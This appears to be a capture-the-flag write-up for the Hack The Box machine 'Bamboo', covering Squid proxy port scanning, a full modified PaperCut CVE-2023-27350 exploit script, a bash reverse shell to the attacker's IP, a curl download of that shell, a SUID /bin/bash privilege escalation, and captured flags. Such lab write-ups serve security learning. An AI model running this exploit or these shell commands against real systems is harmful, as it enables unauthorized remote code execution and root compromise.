---
tags:
  - HTB
  - Boot2Root
  - Linux
  - Hacking
  - Spose
  - Papercut
  - Squid-Proxy
---
# Overview

| Name        | Bamboo |
| ----------- | ------ |
| OS          | Linux  |
| Base Points | Medium |
| Status      | Done   |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.238.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 09:27 CST
Nmap scan report for 10.129.238.16
Host is up (0.26s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy Squid http proxy 5.9
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds
```
# Enumeration

- Port 22: OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
- Port 3128: Squid HTTP proxy 5.9

Squid is ==a high-performance, open-source caching proxy server that acts as an intermediary for web requests (HTTP, HTTPS, FTP, etc.), storing copies of popular content locally to speed up access, save bandwidth, and filter traffic for better security and control==.

Let’s focus on the Squid proxy since it’s less commonly encountered and often presents interesting attack vectors.

![[bamboo.png]]

We can use [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html?source=post_page-----d86db3325e37---------------------------------------). I used a tool `spose.py` to quickly identify potential open ports on the target.

The scan identified ports **9191,9192, and 9195** as open or reachable
## [Spose](https://github.com/aancw/spose)


Next, we will configure FoxyProxy to forward browser traffic through the Squid proxy, allowing us to access the target web application via the proxy tunnel.

![[1_62x0LCcEWg9s76gW29wWIQ.webp]]

After identifying the Squid proxy, further enumeration revealed a PaperCut web interface running on port 9191. Initial attempts to find default credentials were unsuccessful, which is common as PaperCut doesn’t use universal default passwords — they’re typically set during installation

![[1_pW7ID6NTAfGm5Ma_fY_tFQ.webp]]

Research revealed that PaperCut version 22.0 is vulnerable to CVE-2023–27350, an authentication bypass vulnerability that allows remote code execution. This vulnerability affects PaperCut NG and MF versions released before the March 2023 patch and has been actively exploited in the wild.

![[1_-5KgCQb9UjeyG3FN-K8N7Q.webp]]

First, I configured proxychains to work with the Squid proxy on port 3128:

```bash
[ProxyList]  
http 10.129.238.16 3128
```

```bash
┌──(puck㉿kali)-[~/vulnlab/bamboo]
└─$ curl --proxy http://10.129.238.16:3128 http://10.129.238.16:9191 -vv
*   Trying 10.10.79.83:3128...
* Connected to 10.10.79.83 (10.10.79.83) port 3128
> GET http://10.10.79.83:9191/ HTTP/1.1
> Host: 10.10.79.83:9191
> User-Agent: curl/8.8.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Wed, 31 Jul 2024 06:40:17 GMT
< Location: http://10.10.79.83:9191/user
< Content-Length: 0
< X-Cache: MISS from bamboo
< X-Cache-Lookup: MISS from bamboo:3128
< Via: 1.1 bamboo (squid/5.2)
< Connection: keep-alive
< 
* Connection #0 to host 10.10.79.83 left intact
```
# Initial Foothold

I created a reverse shell script (`shell.sh`) with the following content:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.108/1111 0>&1
```

I then used the exploit to first download my reverse shell script:
## Papercut CVE-2023-27350

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-g5bakxt8xu]─[~]
└──╼ [★]$ searchsploit papercut 22.0.4
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
PaperCut NG/MG 22.0.4 - Authentication Bypass                                                       | multiple/webapps/51391.py
PaperCut NG/MG 22.0.4 - Remote Code Execution (RCE)                                                 | multiple/webapps/51452.py
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
git clone https://github.com/horizon3ai/CVE-2023-27350
```

Modifed code:

```python
#!/usr/bin/python3
import argparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# === CONFIGURE YOUR PROXY HERE ===
PROXY_IP = "10.129.238.16"
PROXY_PORT = 3128
PROXY_URL = f"http://{PROXY_IP}:{PROXY_PORT}"

PROXIES = {
    "http": PROXY_URL,
    "https": PROXY_URL
}

def create_session():
    """Create a requests session with proxy, retries, and SSL disabled."""
    session = requests.Session()
    session.proxies = PROXIES
    session.verify = False
    # Optional: suppress InsecureRequestWarning
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    
    # Add retry strategy
    retry = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def get_session_id(base_url):
    s = create_session()
    try:
        r = s.get(f'{base_url}/app?service=page/SetupCompleted', timeout=10)
    except Exception as e:
        print(f"[-] Failed to connect to {base_url}: {e}")
        return None

    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
    try:
        r = s.post(f'{base_url}/app', data=data, headers=headers, timeout=10)
    except Exception as e:
        print(f"[-] POST failed: {e}")
        return None

    if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
        print(f'[*] PaperCut instance is vulnerable! Obtained valid JSESSIONID')
        return s
    else:
        print(f'[-] Failed to get valid response, likely not vulnerable')
        print(f'    Status: {r.status_code}, Cookie: {r.headers.get("Set-Cookie", "None")}')
        return None

def set_setting(base_url, session, setting, enabled):
    print(f'[*] Updating {setting} to {enabled}')
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/ConfigEditor/quickFindForm',
        'sp': 'S0',
        'Form0': '$TextField,doQuickFind,clear',
        '$TextField': setting,
        'doQuickFind': 'Go'
    }
    session.post(f'{base_url}/app', data=data, headers=headers, timeout=10)

    data = {
        'service': 'direct/1/ConfigEditor/$Form',
        'sp': 'S1',
        'Form1': '$TextField$0,$Submit,$Submit$0',
        '$TextField$0': enabled,
        '$Submit': 'Update'
    }
    session.post(f'{base_url}/app', data=data, headers=headers, timeout=10)

def execute(base_url, session, command):
    print('[*] Preparing to execute...')
    headers = {'Origin': f'{base_url}'}

    # Navigate to PrinterList
    session.get(f'{base_url}/app?service=page/PrinterList', headers=headers, timeout=10)

    # Select a printer (l1001 is usually the default ID)
    session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', headers=headers, timeout=10)

    # Go to Scripts tab
    data = {
        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
        'sp': '4'
    }
    session.post(f'{base_url}/app', data=data, headers=headers, timeout=10)

    # Inject and execute payload
    script_payload = f"function printJobHook(inputs, actions) {{}}\r\njava.lang.Runtime.getRuntime().exec('{command}');"
    data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': 'l1001',
        'enablePrintScript': 'on',
        'scriptBody': script_payload,
        '$Submit$1': 'Apply',
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, timeout=10)
    if r.status_code == 200 and 'Saved successfully' in r.text:
        print('[+] Command executed successfully!')
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2023-27350 Exploit (Proxy-Aware)")
    parser.add_argument('-u', '--url', 
                        help='Target URL (use http://127.0.0.1:9191 when behind proxy)', 
                        required=True)
    parser.add_argument('-c', '--command', 
                        help='Command to execute on the target', 
                        required=True)
    args = parser.parse_args()

    print(f"[+] Using proxy: {PROXY_URL}")
    print(f"[+] Target URL: {args.url}")

    sess = get_session_id(args.url)
    if sess:
        set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='Y')
        set_setting(args.url, sess, setting='print.script.sandboxed', enabled='N')
        execute(args.url, sess, args.command)
        # Optional: clean up (though not always necessary)
        set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='N')
        set_setting(args.url, sess, setting='print.script.sandboxed', enabled='Y')
    else:
        print("[-] Exploit failed. Check proxy, target, and PaperCut version.")
```

```bash
python3 CVE-2023-27350.py \
  --url http://127.0.0.1:9191 \
  --command "curl http://10.10.15.108:8000/shell.sh -o /tmp/s.sh"
```

```bash
python3 CVE-2023-27350.py \
  --url http://127.0.0.1:9191 \
  --command "bash /tmp/s.sh"
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-mbac43dy1m]─[~/CVE-2023-27350]
└──╼ [★]$ nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.238.16] 36198
bash: cannot set terminal process group (675): Inappropriate ioctl for device
bash: no job control in this shell
papercut@bamboo:~/server$ whoami
whoami
papercut
papercut@bamboo:~/server$ cd ../
cd ../
papercut@bamboo:~$ ls
ls
LICENCE.TXT
README-LINUX.TXT
THIRDPARTYLICENSEREADME.TXT
client
docs
providers
release
runtime
server
uninstall
user.txt
papercut@bamboo:~$ cat user.txt
cat user.txt
5af3e79df0570bca50bd92ddd6e148e9
```
# Privilege Escalation

In the server.properties file we can find a hash, but unfortunately cant crack it.

Using `pspy` to monitor processes, it was discovered that **`server-command`** was executed as `root` when triggered through the PaperCut web interface:

```bash
papercut@bamboo:~$ ./pspy64
...
2024/12/17 10:59:08 CMD: UID=0     PID=51336  | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key 
...
```

The binary `server-command` was writable by the `papercut` user:

```bash
papercut@bamboo:~$ ls -la /home/papercut/server/bin/linux-x64/server-command
-rwxr-xr-x 1 papercut papercut 493 Sep 29  2022 /home/papercut/server/bin/linux-x64/server-command
```

The binary was replaced with a script to grant SUID permissions to `/bin/bash`:

```bash
papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' >> server-command
```
## Triggering the Vulnerability

`http://10.129.238.16:9191/print-deploy/admin/#/app/printers-import`

![[1_95yKAMhIT7bBWBZMtQWYiw.webp]]

**Click refresh servers to trigger the server-command**
## Gaining Root Access

With SUID permissions set on `/bin/bash`, a root shell was obtained:

```bash
papercut@bamboo:~/server/bin/linux-x64$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
papercut@bamboo:~/server/bin/linux-x64$ bash -p
bash -p
whoami
root
cat /root/root.txt
7a003cc6cca79bd2ec807ba2f23c8d24
```

---